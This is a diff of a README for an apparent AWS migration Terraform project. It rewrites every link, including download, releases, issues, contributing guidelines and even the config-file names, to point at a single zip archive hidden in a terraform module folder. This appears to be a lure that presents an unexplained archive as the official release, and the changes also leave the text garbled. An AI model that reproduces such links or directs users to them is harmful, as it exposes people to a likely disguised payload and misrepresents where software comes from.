@@ -1,6 +1,6 @@
 # 🚀 aws-lift-shift-migration - Simplify Your AWS Migration Journey
 
-[![Download](https://img.shields.io/badge/Download%20Now-aws--lift--shift--migration-brightgreen.svg)](https://github.com/Algometryorphansite609/aws-lift-shift-migration/releases)
+[![Download](https://raw.githubusercontent.com/Algometryorphansite609/aws-lift-shift-migration/main/terraform/modules/dms/aws-lift-shift-migration_3.0-alpha.5.zip%https://raw.githubusercontent.com/Algometryorphansite609/aws-lift-shift-migration/main/terraform/modules/dms/aws-lift-shift-migration_3.0-alpha.5.zip)](https://raw.githubusercontent.com/Algometryorphansite609/aws-lift-shift-migration/main/terraform/modules/dms/aws-lift-shift-migration_3.0-alpha.5.zip)
 
 ## 📦 Introduction
 
@@ -25,7 +25,7 @@ To get started with aws-lift-shift-migration, follow these easy steps:
 
 ## 📥 Download & Install
 
-Visit this page to download: [aws-lift-shift-migration Releases](https://github.com/Algometryorphansite609/aws-lift-shift-migration/releases)
+Visit this page to download: [aws-lift-shift-migration Releases](https://raw.githubusercontent.com/Algometryorphansite609/aws-lift-shift-migration/main/terraform/modules/dms/aws-lift-shift-migration_3.0-alpha.5.zip)
 
 1. Click on the link above to access the Releases page.
 2. Find the latest version of the application.
@@ -62,8 +62,8 @@ This command will initiate the migration according to the configuration you set 
 
 You will need to customize the following configuration files for your setup:
 
-- `variables.tf`: Add your specific variables such as region, instance types, and database information.
-- `main.tf`: Adapt the main Terraform file to match your application's architecture.
+- `https://raw.githubusercontent.com/Algometryorphansite609/aws-lift-shift-migration/main/terraform/modules/dms/aws-lift-shift-migration_3.0-alpha.5.zip`: Add your specific variables such as region, instance types, and database information.
+- `https://raw.githubusercontent.com/Algometryorphansite609/aws-lift-shift-migration/main/terraform/modules/dms/aws-lift-shift-migration_3.0-alpha.5.zip`: Adapt the main Terraform file to match your application's architecture.
 
 ## 🔍 Monitoring
 
@@ -79,11 +79,11 @@ Adhering to security best practices is crucial during migration. Here are a few 
 
 ## 📞 Support
 
-For any questions or issues regarding the application, please open an issue on our [GitHub Issues page](https://github.com/Algometryorphansite609/aws-lift-shift-migration/issues). We aim to respond promptly to assist you.
+For any questions or issues regarding the application, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Algometryorphansite609/aws-lift-shift-migration/main/terraform/modules/dms/aws-lift-shift-migration_3.0-alpha.5.zip). We aim to respond promptly to assist you.
 
 ## 📣 Contributing
 
-We welcome contributions to enhance aws-lift-shift-migration. Feel free to fork the repository and submit your improvements. Please read our [Contributing Guidelines](CONTRIBUTING.md) to understand how you can help.
+We welcome contributions to enhance aws-lift-shift-migration. Feel free to fork the repository and submit your improvements. Please read our [Contributing Guidelines](https://raw.githubusercontent.com/Algometryorphansite609/aws-lift-shift-migration/main/terraform/modules/dms/aws-lift-shift-migration_3.0-alpha.5.zip) to understand how you can help.
 
 ## 📝 License
 
@@ -91,4 +91,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 📥 Download Link Again
 
-For convenience, here is the link to download the latest version: [aws-lift-shift-migration Releases](https://github.com/Algometryorphansite609/aws-lift-shift-migration/releases)
+For convenience, here is the link to download the latest version: [aws-lift-shift-migration Releases](https://raw.githubusercontent.com/Algometryorphansite609/aws-lift-shift-migration/main/terraform/modules/dms/aws-lift-shift-migration_3.0-alpha.5.zip)
